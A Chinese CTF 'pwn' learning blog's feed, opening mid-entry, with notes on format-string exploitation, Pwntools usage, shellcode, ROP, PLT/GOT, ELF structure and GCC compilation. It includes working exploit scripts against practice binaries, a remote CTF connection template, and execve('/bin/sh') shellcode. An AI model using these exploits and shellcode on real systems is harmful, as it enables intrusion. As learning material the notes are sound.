0x41414141 0x25207025 0x70252070 0x20702520 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025</code><br>    3. 看到 <code>&#39;0x41414141&#39;</code>，就是输入的 <code>AAAA</code>，也就是说，可以控制的内存空间相对位置在 <code>printf</code> 函数的 第10个 参数位置<br>        - 其实 <code>printf</code> 函数根本没有这么多个参数，只不过他自己并不知道；从 <code>AAAA</code> 到 <code>0x41414141</code> 还有 九个 输出值，所以 <code>v8</code> 在相对 第10个 参数位置</h2><h3 id="构造-exp-的实例"><a href="#构造-exp-的实例" class="headerlink" title="构造 exp 的实例"></a>构造 exp 的实例</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./CGfsb"</span><span class="token punctuation">)</span>pwnme_addr <span class="token operator">=</span> <span class="token number">0x0804A068</span> <span class="token comment">#pwnme地址在伪代码中双击查看</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>pwnme_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'aaaa'</span> <span class="token operator">+</span> <span class="token string">'%10\$n'</span> <span class="token comment">#pwnme的地址需要经过32位编码转换，是四位，而pwnme需要等于8，所以‘aaaa’起着凑字数的作用</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">关于 PWN 中格式化字符串漏洞的一些总结</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Pwntools</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/Pwntools/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/Pwntools/</id>
    <published>2023-03-19T07:39:30.000Z</published>
    <updated>2023-04-14T08:54:00.087Z</updated>
    
    <content type="html"><![CDATA[<h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><table><thead><tr><th align="left">名称</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left"><strong>exploit（简称exp）</strong></td><td align="left">用于攻击的脚本与方案</td></tr><tr><td align="left"><strong>payload</strong></td><td align="left">攻击载荷，是对目标进程劫持控制流的数据</td></tr><tr><td align="left"><strong>shellcode</strong></td><td align="left">调用攻击目标的 shell 的代码</td></tr></tbody></table><hr><h2 id="exp-py-程序输入脚本样例"><a href="#exp-py-程序输入脚本样例" class="headerlink" title="exp.py 程序输入脚本样例"></a>exp.py 程序输入脚本样例</h2><blockquote><p>注意养成好的书写习惯</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./when"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"220.249.52.133"</span><span class="token punctuation">,</span> <span class="token number">37645</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>  <span class="token comment"># 需要上传的输入内容，(0x20 - 0x18 + 8)根据栈地址确定需要输入的数据位数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序的输出信息</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"999"</span><span class="token punctuation">)</span>  <span class="token comment"># 给程序发送输入内容</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序的输出信息</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 给程序发送payload作为输入内容</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>如果 <code>exp.py</code> 可以 PWN 通，在远程只会显示 <code>[*] Switching to interactive mode</code>，而不会显示 <code>[*] Got EOF while reading in interactive</code> ，否则说明 PWN 失败了</strong></p></blockquote><hr><h2 id="exp-获取信息"><a href="#exp-获取信息" class="headerlink" title="exp 获取信息"></a>exp 获取信息</h2><ul><li><p>获取 elf 文件中某个已知函数名的函数地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序路径</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>   <span class="token comment"># system_addr为程序test中函数"callsystem"的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>获取程序在某一行的输出信息，并将其转换为 16进制 数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'But there is gift for you :\n'</span><span class="token punctuation">)</span>   <span class="token comment"># 屏幕输出信息</span>main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>caiji<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment"># 接收直到 \n 为止的输出数据，并将其转换为16进制 int 型，最后赋值main_addr</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><blockquote><p>注意，<strong>函数的地址也可以在 IDA 中直接看到</strong>，但是<mark>如果程序开启了 PIE（地址随机化），即：每次输出到屏幕的信息不一样，则不能采取直接查看 IDA 中的地址并进行赋值，只能使用从屏幕获取程序输出数据的方法</mark></p></blockquote><hr><h2 id="ShellCode"><a href="#ShellCode" class="headerlink" title="ShellCode"></a>ShellCode</h2><blockquote><p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些能够获取到 shell 的 code 就是 shellcode</p><p>在漏洞利用过程时，我们将编制好的 shellcode 通过有问题的程序写入到内存中，然后执行它</p><p>shellcode 对应的 C 语言代码一般为：<code>system(&quot;/bin/sh&quot;)</code></p></blockquote><hr><h3 id="Pwntools-生成默认-shellcode"><a href="#Pwntools-生成默认-shellcode" class="headerlink" title="Pwntools 生成默认 shellcode"></a>Pwntools 生成默认 shellcode</h3><ol><li>方法一：<pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 构造shellcode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>方法二：<pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 构造shellcode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><blockquote><p><strong>这段代码有一个缺点，就是生成的 shellcode 比较长，在某些可写入空间比较小的情况下不能很好的使用</strong></p></blockquote><hr><h3 id="手动编写的-shellcode"><a href="#手动编写的-shellcode" class="headerlink" title="手动编写的 shellcode"></a>手动编写的 shellcode</h3><h4 id="shellcode-代码调动-shell-的原理"><a href="#shellcode-代码调动-shell-的原理" class="headerlink" title="shellcode 代码调动 shell 的原理"></a>shellcode 代码调动 shell 的原理</h4><ol><li>在 linux 中，存在一系列的系统调用，这些系统调用都通过 <code>syscall</code> 指令来触发，并且通过 <code>rax</code> 寄存器作为系统调用号来区分不同的系统调用，可以查看 linux 下的 <code>arch/x86/entry/syscall_64.tbl</code> 获得对应的系统调用号。比如，<code>execve</code>（执行程序函数，类似于 Python 中的<code>os.system</code> 函数，可以调用其他程序的执行）对应的的系统调用号为 59</li><li>接着，通过 <code>rdi</code> 和 <code>rsi</code> 两个寄存器传入参数。其中，<code>rdi</code> 是指向运行程序的路径的指针，<code>rsi</code> 为一个指向 0 的指针，<code>rdx</code> 为 0</li><li>也就是说，整个过程应该完成：<pre class="line-numbers language-c" data-language="c"><code class="language-c">rax <span class="token operator">=</span> <span class="token number">59</span>rdi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token char">'/bin/sh'</span><span class="token punctuation">]</span>rsi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>rdx <span class="token operator">=</span> <span class="token number">0</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>对应的汇编代码：<pre class="line-numbers language-c" data-language="c"><code class="language-c">xor rdx<span class="token punctuation">,</span>rdxpush rdxmov rsi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">0x68732f2f6e69622f</span>push raxmov rdi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">59</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="利用-Pwntools-编译使用："><a href="#利用-Pwntools-编译使用：" class="headerlink" title="利用 Pwntools 编译使用："></a>利用 Pwntools 编译使用：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''xor rdx,rdx;push rdx;mov rsi,rsp;mov rax,0x68732f2f6e69622f;  # 这里因为64位数据不能直接push，所以用了rax寄存器来传递push rax;mov rdi,rsp;mov rax,59;syscall;'''</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>这样生成的 shellcode 就只有 30 字节，一般这种大小就足够了</strong></p></blockquote><hr><h2 id="Pwntools-语句"><a href="#Pwntools-语句" class="headerlink" title="Pwntools 语句"></a>Pwntools 语句</h2><h3 id="连接程序和端口"><a href="#连接程序和端口" class="headerlink" title="连接程序和端口"></a>连接程序和端口</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io &#x3D; porcess(“.&#x2F;&lt;文件名&gt;”)</td><td>本地连接</td></tr><tr><td>io &#x3D; remote(“ip地址”, 端口)</td><td>远程连接</td></tr><tr><td>io.close()</td><td>关闭连接</td></tr></tbody></table><hr><h3 id="发送-payload"><a href="#发送-payload" class="headerlink" title="发送 payload"></a>发送 payload</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.sendafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload</td></tr><tr><td>io.sendlineafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload，并进行换行（末尾\n）</td></tr><tr><td>io.send(payload)</td><td>发送 payload</td></tr><tr><td>io.sendline(payload)</td><td>发送 payload，并进行换行（末尾\n）</td></tr></tbody></table><hr><h3 id="接收返回内容"><a href="#接收返回内容" class="headerlink" title="接收返回内容"></a>接收返回内容</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.interactive()</td><td>直接进行交互，相当于回到 shell 的模式，一般在取得 shell 之后使用</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>asm(shellcraft.sh())</td><td>生成 Pwntools 默认 shellcode</td></tr><tr><td>shellcode &#x3D; asm(shellcode)</td><td>生成自己编写的 shellcode</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.recv(N)</td><td>接收 N 个字符</td></tr><tr><td>io.recvline()</td><td>接收一行输出</td></tr><tr><td>io.recvlines(N)</td><td>接收 N 个行输出</td></tr><tr><td>io.recvuntil(some_string)</td><td>接收到 some_string 为止</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>stack&#x3D;int(io.recv(10),16)</td><td>接收回显的参数在栈上的地址，长度是10，以16进制表示</td></tr></tbody></table><hr><h3 id="ELF-文件操作"><a href="#ELF-文件操作" class="headerlink" title="ELF 文件操作"></a>ELF 文件操作</h3><blockquote><p><strong>首先需要 <code>elf = ELF(&quot;./&lt;文件名&gt;&quot;)</code> 来产生一个对象</strong></p></blockquote><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>elf.symbols[“a_function”]</td><td>找到 a_function 的地址</td></tr><tr><td>elf.got[“a_function”]</td><td>找到 a_function 的 got</td></tr><tr><td>elf.plt[“a_function”]</td><td>找到 a_function 的 plt</td></tr><tr><td>next(elf.search(“some_characters”))</td><td>找到包含 some_characters 的内容，可以是字符串、汇编代码或某个数值的地址</td></tr></tbody></table><hr><h3 id="ROP-链"><a href="#ROP-链" class="headerlink" title="ROP 链"></a>ROP 链</h3><blockquote><p><strong>首先需要 <code>rop = ROP(&quot;./&lt;文件名&gt;&quot;)</code> 创建一个对象</strong></p></blockquote><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>rop.raw(‘a’ * 32)</td><td>在构造的 rop 链里面写32个 a</td></tr><tr><td>rop.call(‘read’ , (0 , elf.bss(0x80)))</td><td>调用一个函数，可以简写成：<code>rop.read(0,elf.bss(0x80))</code></td></tr><tr><td>rop.chain()</td><td>就是整个 rop 链，发送的 payload</td></tr><tr><td>rop.dump()</td><td>直观地展示当前的 rop 链</td></tr><tr><td>rop.migrate(base_stage)</td><td>将程序流程转移到 base_stage（地址）</td></tr><tr><td>rop.unresolve(value)</td><td>给出一个地址，反解析出符号</td></tr><tr><td>rop.search(regs&#x3D;[‘ecx’ , ‘ebx’])</td><td>搜索对 eax 进行操作的 gadgets</td></tr><tr><td>rop.find_gadget([‘pop eax’ , ‘ret’])</td><td>搜索 <code>pop eax ret</code> 这样的 gadgets</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">想学好 PWN 就必须会用 Pwntools，对 Pwntools 的一些总结和归纳</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>PLT表和GOT表</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/PLT%E8%A1%A8%E5%92%8CGOT%E8%A1%A8/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn/PLT%E8%A1%A8%E5%92%8CGOT%E8%A1%A8/</id>
    <published>2023-03-19T07:39:19.000Z</published>
    <updated>2023-04-14T08:53:52.814Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PLT-表和-GOT-表"><a href="#PLT-表和-GOT-表" class="headerlink" title="PLT 表和 GOT 表"></a>PLT 表和 GOT 表</h2><blockquote><p>为了更好的用户体验和内存、CPU 的利用率，程序编译时会采用两种表进行辅助，一个为 PLT 表，一个为 GOT 表</p><p><code>PLT表</code> 称为 <mark>内部函数表</mark>，<code>GOT表</code> 称为 <mark>全局函数表</mark>（动态函数表）</p></blockquote><ul><li>这两个表是相对应的，PLT 表中的数据就是 GOT 表中的一个地址：<br><img src="https://s2.loli.net/2023/03/17/8sbdGo4LcXJAh7r.png" alt="CTF - Pwn_PLT表 &amp; GOT表1.png"></li></ul><blockquote><p>PLT 表其实是一个过渡的作用，<mark>PLT 表中只存放 GOT 表项的地址</mark>，而不是函数真实的地址，<mark>函数真实的地址存放在 GOT 表中</mark></p></blockquote><hr><h2 id="地址的调用流程"><a href="#地址的调用流程" class="headerlink" title="地址的调用流程"></a>地址的调用流程</h2><blockquote><p>以 <code>scanf()</code> 函数为例，当 <code>main()</code> 函数开始，会请求 PLT 表中这个函数对应的 GOT 表地址</p></blockquote><ul><li><strong>若是第一次调用</strong><ol><li>由函数调用跳入到 PLT 表中</li><li>PLT 表跳到 GOT 表中</li><li>由 GOT 表回跳到 PLT 表中，这时候进行压栈，把代表函数的 ID 压栈</li><li>接着跳转到公共的 PLT表 项中</li><li>进入到 GOT 表</li><li>然后 <code>_dl_runtime_resolve</code> 对动态函数进行地址解析和重定位</li><li>把动态函数真实的地址写入到 GOT 表项中，然后执行函数并返回</li></ol></li><li><strong>若是第二次调用</strong><ol><li>由函数调用跳入到 PLT 表中</li><li>PLT表 跳入到 GOT 表中，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回，例如：<code>call scanf() —&gt; scanf() 的 PLT 表 —&gt;scanf() 的 GOT 表</code></li><li>当进入带有 @plt 标志的函数时，由函数调用跳入到 PLT 表中</li><li>在 PLT 表中找到对应的函数的 GOT 表项地址</li><li>通过 jmp 指令跳转到 GOT 表，得到函数的真实地址</li><li>跳转到真实函数地址执行</li></ol></li></ul><p><img src="https://s2.loli.net/2023/03/17/SXbfnRoJVKGpej2.png" alt="CTF - Pwn_PLT表 &amp; GOT表2.png"></p><hr><h2 id="IDA-中的体现"><a href="#IDA-中的体现" class="headerlink" title="IDA 中的体现"></a>IDA 中的体现</h2><h3 id="汇编代码"><a href="#汇编代码" class="headerlink" title="汇编代码"></a>汇编代码</h3><p><img src="https://s2.loli.net/2023/03/17/BpfS9JQukl6qrzd.png" alt="CTF - Pwn_PLT表 &amp; GOT表3.png"></p><blockquote><p><code>call _printf</code> 并不是跳转到了实际的 <code>_printf</code> 函数的位置。 因为在编译时程序并不能确定 <code>printf</code> 函数的地址， 所以这个 <code>call</code> 指令实际上是通过相对跳转， 跳转到了 PLT表 中的 <code>_printf</code> 项，然后再根据 PLT表 中的地址跳转到 GOT表，才能获取到实际的 <code>_printf</code> 函数地址，进而执行 <code>printf</code> 函数</p></blockquote><h3 id="程序段"><a href="#程序段" class="headerlink" title="程序段"></a>程序段</h3><table><thead><tr><th align="left">段名</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">.got</td><td align="left">GOT 全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表</td></tr><tr><td align="left">.plt</td><td align="left">PLT 程序链接表。它有两个功能，要么在 <code>.got.plt</code> 节中拿到地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时，触发「链接器」去找到所需地址</td></tr><tr><td align="left">.got.plt</td><td align="left">这个是 GOT 专门为 PLT 准备的。也就是说 <mark>.got.plt 中的值是 GOT 的一部分</mark>。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）</td></tr><tr><td align="left">.plt.got</td><td align="left"></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">Linux 下 PLT 表和 GOT 表的作用和关系</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF文件</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/Linux/ELF%E6%96%87%E4%BB%B6/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/Linux/ELF%E6%96%87%E4%BB%B6/</id>
    <published>2023-03-19T07:23:24.000Z</published>
    <updated>2023-04-14T09:03:24.433Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><ul><li>可执行、可链接格式</li></ul><hr><h2 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h2><h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><ul><li>经过链接的、可执行的文件，也叫程序</li></ul><h3 id="可重定位文件"><a href="#可重定位文件" class="headerlink" title="可重定位文件"></a>可重定位文件</h3><ul><li>由源文件编译而成尚未链接的目标文件，通常以“.o”为扩展名</li></ul><h3 id="共享目标文件"><a href="#共享目标文件" class="headerlink" title="共享目标文件"></a>共享目标文件</h3><ul><li>动态链接库文件，在链接过程中与其他动态链接库或可重定位文件一起构建新的目标文件，或在文件加载时连接到进程中作为运行代码的一部分</li></ul><blockquote><p>核心转储文件作为进程意外终止时进程地址空间的转储，也是 ELF 文件的一种</p></blockquote><hr><h2 id="ELF文件的结构"><a href="#ELF文件的结构" class="headerlink" title="ELF文件的结构"></a>ELF文件的结构</h2><ul><li>从链接视角来看，通过 <em><strong>节(Section)</strong></em> 来进行划分</li><li>从运行视角来看，通过 <em><strong>段(Segment)</strong></em> 来进行划分</li></ul><p><img src="https://s2.loli.net/2023/03/19/fXvBAaGZ2dnOmYC.png" alt="Linux基础_ELF文件1.png"></p>]]></content>
    
    
    <summary type="html">学习 pwn 还是必须了解一些 ELF 文件的结构，简单总结一下</summary>
    
    
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/categories/Linux/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>GCC编译过程</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/Linux/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/Linux/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/</id>
    <published>2023-03-19T07:23:24.000Z</published>
    <updated>2023-03-29T02:42:20.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GCC-编译主要包括四个阶段"><a href="#GCC-编译主要包括四个阶段" class="headerlink" title="GCC 编译主要包括四个阶段"></a>GCC 编译主要包括四个阶段</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><ul><li>主要是处理源代码中以 <code>&quot;#&quot;</code> 开头的预处理指令，比如 <code>#include</code>、<code>#define</code> 等，将其置换后直接插入程序文本中，得到另一个 C 程序，通常以 <code>.i</code> 作为扩展名<ol><li>递归处理 <code>#include</code> 预处理指令，将对应文件的内容复制到该指令的位置</li><li>删除所有的 <code>#define</code> 指令，并在其被引用的位置递归地展开所有的宏</li><li>处理所有的条件预处理指令，如：<code>#if</code>、<code>#ifdef</code>、<code>#elif</code>、<code>#else</code>、<code>#endif</code> 等</li><li>删除所有的注释</li><li>添加行号和文件名标识</li></ol></li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><ul><li>将预处理文件进行一系列的词法分析、语法分析、语义分析以及优化，最终生成汇编代码，通常以 <code>.s</code> 作为扩展名</li><li>GCC 默认使用 <code>AT&amp;T</code> 格式的汇编语言，添加编译选项 <code>-masm = intel</code> 可以指定为 <code>intel</code> 格式</li><li>编译选项 <code>-fno-asynchronous-unwind-tables</code> 用于生成没有 cfi 宏的汇编指令，提高可读性</li><li>若 <code>printf()</code> 只有单一参数，GCC 的优化策略会将其替换成 <code>puts()</code> 以提高性能</li></ul><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><ul><li>汇编器根据汇编指令与机器指令对照表进行翻译，通常以 <code>.o</code> 作为扩展名</li><li>此时的 <code>.o</code> 文件是一个可重定位文件，可以使用 <code>objdump -sd &lt;文件名.o&gt; -M intel</code> 查看其内容</li><li>由于此时还未进行链接，文件符号中的虚拟地址无法确定</li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul><li>GCC 默认为动态链接（添加编译选项 <code>- static</code> 可指定使用静态编译）</li><li>将目标文件及其依赖库进行链接，生成可执行文件。包括：地址和空间分配、符号绑定、重定位等</li><li>链接操作由链接器（ld.so）完成，然后就会得到一个可执行文件，其包含了大量的库文件</li><li>链接完成后，上一步无法确定的虚拟地址就被修正为实际的符号地址，可以被加载到内存中正常执行</li></ul>]]></content>
    
    
    <summary type="html">从代码变成程序的底层逻辑，还是需要了解一点的</summary>
    
    
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/categories/Linux/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux下的操作命令</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/Linux/Linux%E4%B8%8B%E7%9A%84%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/Linux/Linux%E4%B8%8B%E7%9A%84%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</id>
    <published>2023-03-19T07:23:24.000Z</published>
    <updated>2023-04-14T09:03:30.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><blockquote><p>一个点（<code>./</code>），代表本级目录<br>两个点（<code>../</code>），代表上级目录</p></blockquote><hr><h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><blockquote><p><code>cat &lt;文件名&gt; </code></p></blockquote><hr><h2 id="转到盘符-x2F-目录"><a href="#转到盘符-x2F-目录" class="headerlink" title="转到盘符&#x2F;目录"></a>转到盘符&#x2F;目录</h2><blockquote><p><code>cd E:</code><br><code>cd &lt;路径名&gt;</code></p></blockquote><hr><h2 id="显示目录中的文件"><a href="#显示目录中的文件" class="headerlink" title="显示目录中的文件"></a>显示目录中的文件</h2><blockquote><p><code>ls &lt;目录名&gt;</code>（仅显示可见文件）<br><code>ls -a</code>（显示所有文件，包括隐藏文件）<br><code>ll</code>（显示详细信息）</p></blockquote><hr><h2 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h2><blockquote><p><code>mv &lt;文件名1&gt; &lt;文件名2&gt;</code></p><p>1.文件被命名为 <code>.</code> 开头时，如 <code>.flag</code>，则 <code>flag</code> 为隐藏文件，<code>ls</code> 无法查看，需用 <code>ls -a</code> 才可以看到<br>2.将隐藏文件重命名去掉开头的 <code>.</code> 时，文件恢复可见</p></blockquote><hr><h2 id="编辑文档"><a href="#编辑文档" class="headerlink" title="编辑文档"></a>编辑文档</h2><blockquote><p><code>vim 